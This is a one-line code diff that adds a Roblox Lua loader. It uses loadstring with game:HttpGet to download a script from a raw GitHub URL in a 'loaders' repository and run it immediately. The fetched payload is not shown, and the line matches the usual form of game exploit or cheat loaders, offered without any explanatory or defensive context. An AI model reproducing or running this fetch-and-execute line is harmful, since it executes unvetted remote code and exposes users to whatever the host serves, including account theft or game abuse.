@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/makeup-star-spam6-l9nfx2zwo9mrl2.lua"))()
